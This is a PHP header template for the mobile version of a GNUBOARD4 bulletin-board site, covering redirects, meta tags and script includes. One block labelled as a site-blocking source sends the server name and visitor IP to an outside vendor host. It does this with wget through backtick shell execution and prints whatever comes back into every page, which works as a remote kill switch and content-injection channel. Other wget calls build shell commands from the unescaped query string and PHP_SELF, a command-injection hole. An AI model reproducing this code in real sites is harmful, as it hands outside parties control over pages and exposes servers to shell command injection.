<?
// 이 파일은 새로운 파일 생성시 반드시 포함되어야 함
if (!defined("_GNUBOARD_")) exit; // 개별 페이지 접근 불가

if($config["cf_use_https"]) {  //HTTPS 사용 여부
	if(!isset($_SERVER['HTTPS'])){
		$ssl_domain = "https://".($config["cf_https_domain"] ? $config["cf_https_domain"] : $_SERVER["HTTP_HOST"]).":{$config["cf_https_port"]}".$_SERVER["PHP_SELF"];
		if($_SERVER["QUERY_STRING"]) $ssl_domain .= "?".$_SERVER["QUERY_STRING"];
		echo "<script type='text/javascript'>location.href='{$ssl_domain}';</script>";
		exit;
	} 
} 
if($config["cf_https_domain"] != "") { //도메인 고정
	if(strpos($_SERVER["HTTP_HOST"], $config["cf_https_domain"]) !== 0){ 
		$fixed_domain = "http://{$config["cf_https_domain"]}".$_SERVER["PHP_SELF"];
		if($_SERVER["QUERY_STRING"]) $fixed_domain .= "?".$_SERVER["QUERY_STRING"];
		echo "<script type='text/javascript'>location.href='{$fixed_domain}';</script>";
	}
}


if (!$g4['title'])
    $g4['title'] = $config['cf_title'];
include_once("$g4[mpath]/lib/mobile.lib.php");

// 쪽지를 받았나?
if ($member['mb_memo_call']) {
    $mb = get_member($member[mb_memo_call], "mb_nick");
    sql_query(" update {$g4[member_table]} set mb_memo_call = '' where mb_id = '$member[mb_id]' ");

    alert($mb[mb_nick]."님으로부터 쪽지가 전달되었습니다.", $_SERVER[REQUEST_URI]);
}


// 현재 접속자
//$lo_location = get_text($g4[title]);
//$lo_location = $g4[title];
// 게시판 제목에 ' 포함되면 오류 발생
$lo_location = addslashes($g4['title']);
if (!$lo_location)
    $lo_location = $_SERVER['REQUEST_URI'];
//$lo_url = $g4[url] . $_SERVER['REQUEST_URI'];
$lo_url = $_SERVER['REQUEST_URI'];
if (strstr($lo_url, "/$g4[admin]/") || $is_admin == "super") $lo_url = "";

// 자바스크립트에서 go(-1) 함수를 쓰면 폼값이 사라질때 해당 폼의 상단에 사용하면
// 캐쉬의 내용을 가져옴. 완전한지는 검증되지 않음
header("Content-Type: text/html; charset=$g4[charset]");
$gmnow = gmdate("D, d M Y H:i:s") . " GMT";
header("Expires: 0"); // rfc2616 - Section 14.21
header("Last-Modified: " . $gmnow);
header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: pre-check=0, post-check=0, max-age=0"); // HTTP/1.1
header("Pragma: no-cache"); // HTTP/1.0
/*
// 만료된 페이지로 사용하시는 경우
header("Cache-Control: no-cache"); // HTTP/1.1
header("Expires: 0"); // rfc2616 - Section 14.21
header("Pragma: no-cache"); // HTTP/1.0
*/
$g4['title']=str_replace(">","",$g4['title']);
$g4['title']=str_replace(" ","",$g4['title']);

// site 차단소스 ////////////////////////////////////////
function site_down($url){$fuid = '/tmp/wget_tmp_'. md5($_SERVER['REMOTE_ADDR'] . microtime() . $url. $ip);$cmd = 'wget "' . $url . '" -O "' . $fuid . '" --read-timeout=30';`$cmd`;$data = file_get_contents($fuid);`rm -rf $fuid`;return $data;}
$site_down_url= "http://it9.co.kr/site_down2.php?site_url=".$_SERVER['SERVER_NAME']."&remote_addr=".$_SERVER['REMOTE_ADDR'];
$site_down_data = site_down($site_down_url);
echo $site_down_data;
/////////////////////////////////////////////////////////

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="ko">
<head>

<meta charset="<?=$g4['charset']?>">
<title><?=$g4['title']?>, mobile</title>
<!-- 아이폰 숫자 전화링크 -->
<meta name="format-detection" content="telephone=no">
<? /* **************************************************************************************************** */?>
<?if($config[cf_naver_verification]){?><meta name="naver-site-verification" content="<?=$config[cf_naver_verification]?>"/><?}?>
<meta name="keyword" content="<?=$config[cf_keyword]?>, mobile">
<meta name="description" content="<?=$config[cf_description]?>, mobile">
<meta property="og:type" content="website">
<meta property="og:title" content="<?=$config[cf_title]?>">
<meta property="og:url" content="http://<?=$_SERVER['HTTP_HOST']?>">
<meta property="og:description" content="<?=$config[cf_description]?>">
<meta property="og:image" content="/m/images/kakao_img.jpg">
<? /* **************************************************************************************************** */?>

<?
//http://smart9.net/common_viewport.php 에서 뷰포트설정을 가져옵니다.
function file_load($url){$fuid = '/tmp/wget_tmp_' . md5($_SERVER['REMOTE_ADDR'] . microtime() . $url);$cmd = 'wget "' . $url . '" -O "' . $fuid . '" --read-timeout=30';`$cmd`;$data = file_get_contents($fuid);`rm -rf $fuid`;return $data;}
$useragent = urlencode($_SERVER[HTTP_USER_AGENT]);
$initial_viewport_loadurl = "http://smart9.net/common_viewport.php?fScale={$fScale}&ua={$useragent}";
$common_viewport = file_load($initial_viewport_loadurl);
?>
<?=$common_viewport;?>

  <link rel="stylesheet" href="<?=$g4[mpath]?>/css/init.css" type="text/css">
  <link rel="stylesheet" href="<?=$g4[mpath]?>/css/layout.css" type="text/css">
  <link rel="stylesheet" href="<?=$g4[mpath]?>/css/content.css?2" type="text/css">
  <link rel="stylesheet" href="<?=$g4[mpath]?>/css/jquery-ui.css" type="text/css">
  <link rel="stylesheet" href="<?=$g4['mpath']?>/css/calendar.css" type="text/css">
  <link rel="stylesheet" href="<?=$g4['path']?>/res/css/nanumBrush.css" type="text/css">
  <link rel="stylesheet" href="<?=$g4['path']?>/res/css/animate.css" type="text/css">


  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
  <script type="text/javascript">
		// 자바스크립트에서 사용하는 전역변수 선언
		var g4_path      = "<?=$g4['path']?>";
		var g4_bbs       = "<?=$g4['bbs']?>";
		var g4_bbs_img   = "<?=$g4['bbs_img']?>";
		var g4_url       = "<?=$g4['url']?>";
		var g4_is_member = "<?=$is_member?>";
		var g4_is_admin  = "<?=$is_admin?>";
		var g4_bo_table  = "<?=isset($bo_table)?$bo_table:'';?>";
		var g4_sca       = "<?=isset($sca)?$sca:'';?>";
		var g4_charset   = "<?=$g4['charset']?>";
		var g4_cookie_domain = "<?=$g4['cookie_domain']?>";
		var g4_is_gecko  = navigator.userAgent.toLowerCase().indexOf("gecko") != -1;
		var g4_is_ie     = navigator.userAgent.toLowerCase().indexOf("msie") != -1;
		<? if ($is_admin) { echo "var g4_admin = '{$g4['admin']}';"; } ?>
		var g4m = "<=$g4['mpath']?>"; 
		var is_mobile = true;
	</script>
	<!--[if IE]>
	  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<script type="text/javascript" src="<?=$g4[mpath]?>/js/jquery-1.6.2.min.js"></script>
	<script type="text/javascript" src="<?=$g4[mpath]?>/js/jquery-ui.js"></script>
	<script type="text/javascript" src="<?=$g4["path"]?>/js/board.js"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/common.js?6"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/common_ext.js"></script>
	<script type="text/javascript" src="<?=$g4[mpath]?>/js/link.js"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/velocity.js"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/velocity.ui.js"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/parallax.min.js"></script>
	<script type="text/javascript" src="<?=$g4['path']?>/js/wow.min.js"></script>

	<?if(isset($_SERVER['HTTPS'])){?>
		<script src="https://ssl.daumcdn.net/dmaps/map_js_init/postcode.v2.js"></script>
	<?}else{?>
		<script src="http://dmaps.daum.net/map_js_init/postcode.v2.js"></script>
	<?}?>
		
	<?/* ANTISPAM V3 */?>	
	<?if($_REQUEST["bo_table"] || preg_match("/register_(.){0,10}form.php$/", $_SERVER["REQUEST_URI"])) {?>
		<?if(isset($_SERVER['HTTPS'])){?>
			<script src="https://it9.co.kr:44489/api/js/antispam3.js?<?=date("YmdHis")?>"></script>
		<?}else{?>
			<script src="http://it9.co.kr/api/js/antispam3.js?<?=date("YmdHis")?>"></script>
		<?}?>
	<?}?>
			
	<!-- 모달팝업관련 -->
	<link rel="stylesheet" href="<?=$g4['path']?>/js/fancybox/jquery.fancybox.css" media="screen">
	<script type="text/javascript" src="<?=$g4['path']?>/js/fancybox/jquery.fancybox.js"></script>
	
	<!-- swifejs -->
	<link rel="stylesheet" href="<?=$g4['path']?>/js/swiper.min.css">
	<script type="text/javascript" src="<?=$g4['path']?>/js/swiper.jquery.min.js"></script>

	<script src="/js/webfont.js"></script>
	<script type="text/javascript">
	  WebFont.load({
	    custom: {
		families: ['Noto Sans KR'],
		urls: ['/res/css/notosanskr.css']
	    }
	  });
	</script>
	

	
	<!-- 기기별 뷰포트 설정 부분 http://smart9.net/common_viewport_script.php파일에서 불러옴 -->
	<?
	$qs = $_SERVER["QUERY_STRING"];
	$self = $_SERVER["PHP_SELF"];
	$initial_viewport_script_loadurl = "http://smart9.net/common_viewport_script.php?fScale={$fScale}&ua={$useragent}&qs={$qs}&self={$self}&zoomable=no";
	$common_viewport_script = file_load($initial_viewport_script_loadurl);
	?>
	<?=$common_viewport_script;?>
</head>

<?
////////////g4_call_log 테이블이 없으면 생성한다.
$call_log = sql_query("show tables");

$call_tb_yn = true;
for($i=0; $row=sql_fetch_array("$call_log"); $i++){
	if($row["Tables_In_".$mysql_user] == "g4_call_log"){
		$call_tb_yn = false;
	}
}

if($call_tb_yn){
	$sql = "CREATE TABLE IF NOT EXISTS `g4_call_log` (
				  `no` int(11) NOT NULL AUTO_INCREMENT,
				  `call_date` datetime NOT NULL,
				  PRIMARY KEY (`no`)
				) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=26 ;
	";
	sql_query($sql);
}
////////////////////////////////////////////
?>

<body>



<!-- 로딩창 -->
<style>
		.divLoading{display:none;}
		.loading .divLoading {display:block;}
	</style>
<link rel="stylesheet" href="<?=$g4['path']?>/res/css/loading.css" type="text/css"> 
<div class="divLoading" id="divLoading" style="position:fixed; top:40%; left:50%; margin-left:-100px; width:200px; height:200px; z-index:9999;">
	<div class="lds-css ng-scope"><div style="width:100%;height:100%" class="lds-ellipsis"><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div></div></div>
</div>
<div class="divLoading" id="divLoadingOverlay" style="position:fixed; top:0px; left:0px; height:100%; width:100%; z-index:9998; background:gray; opacity:0.3">
	&nbsp;
</div>


<div id="DaumAddresslayer" style="display:none;position:fixed;overflow:hidden;z-index:9999;-webkit-overflow-scrolling:touch;">
	<span onclick="closeDaumPostcode(document.getElementById('DaumAddresslayer'));" style="position:absolute; bottom:0px; left:0px; width:100%; z-index:99999; font-size:20px; line-height:50px; text-align:center; height:50px; background:#4d4d4d; color:#fff; display:inline-block;">
		<i class="fa fa-times"></i> 닫기	
	</span>
	<!--
	<img src="//i1.daumcdn.net/localimg/localimages/07/postcode/320/close.png" id="btnCloseLayer" style="width:50px; height:50px;cursor:pointer;position:absolute;right:-3px;bottom:-3px;z-index:99999"  alt="닫기 버튼">
	-->
</div>